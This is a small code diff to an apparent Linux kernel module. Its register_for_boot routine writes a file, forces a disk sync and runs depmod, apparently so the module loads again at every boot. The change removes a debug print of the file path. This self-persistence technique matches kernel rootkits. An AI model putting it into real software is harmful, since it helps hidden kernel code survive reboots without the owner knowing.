@@ -76,7 +76,6 @@ char* register_for_boot() {
     char *hargv[] = {DEPMOD_PATH, "-a", NULL};
     char *henvp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
     char* file_full_path = get_file_path();
-    printk("%s\n", file_full_path);
     file = file_open(file_full_path, O_CREAT | O_RDWR | O_TRUNC, 0);
     if (NULL == file) {
         goto release_resources;
@@ -90,7 +89,6 @@ char* register_for_boot() {
     file_sync(file);
     file_close(file);
     ((ksys_sync)kallsyms_lookup_name("ksys_sync"))(); 
-    
     if (0 != call_usermodehelper(DEPMOD_PATH, hargv, henvp, UMH_WAIT_PROC)) {
         printk("Failed calling depmod\n");
     }
